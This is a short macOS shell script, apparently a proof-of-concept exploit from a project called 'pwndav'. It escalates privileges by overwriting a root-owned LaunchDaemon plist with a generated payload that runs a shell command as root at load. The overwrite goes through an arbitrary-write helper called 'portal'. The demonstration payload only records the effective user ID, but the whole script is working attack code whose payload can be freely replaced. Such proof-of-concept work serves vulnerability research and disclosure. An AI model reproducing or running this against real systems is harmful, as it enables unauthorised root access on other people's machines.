#!/bin/sh

#  exploit_launchd.sh
#  pwndav
#
#  Created by Chakra on 01/02/20.
#  Copyright Â© 2020 Sreejith Krishnan R. All rights reserved.

# Find a plist file in /Library/LaunchDaemons owned by root with read access to others
TARGET=`find /Library/LaunchDaemons -name "*.plist" -depth 1 -type f -user root -perm -o+r | tail -n 1`

if [ -z "$TARGET" ]; then
  echo "[ERROR] no plist owned by root with read permission exist in /Library/LaunchDaemons"
  exit 1;
fi

echo "[INFO] selected target $TARGET"

# Target file name
TARGET_NAME=`basename -- $TARGET`

# Target backup file name
TARGET_BACKUP=$TARGET_NAME.backup

# Backup existing plist file
if [ -f $TARGET_BACKUP ]; then
  echo "[INFO] skipping backup for target $TARGET_NAME since backup already exist"
else
  cp $TARGET ./$TARGET_BACKUP
  echo "[INFO] backup for taret $TARGET_NAME created at $TARGET_BACKUP"
fi

# Generate payload
cat <<EOT>> $TARGET_NAME.mod
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>KeepAlive</key>
    <false/>
    <key>Label</key>
    <string>${TARGET_NAME%.plist}</string>
    <key>ProgramArguments</key>
    <array>
      <string>sh</string>
      <string>-c</string>
      <string>echo \$EUID > /tmp/exploit_launchd.txt</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>UserName</key>
    <string>root</string>
  </dict>
</plist>
EOT

# Deploy payload
echo "[INFO] writing payload to $TARGET"
./portal write $TARGET $TARGET_NAME.mod
echo "[INFO] payload deployed"

# Cleanup
rm $TARGET_NAME.mod
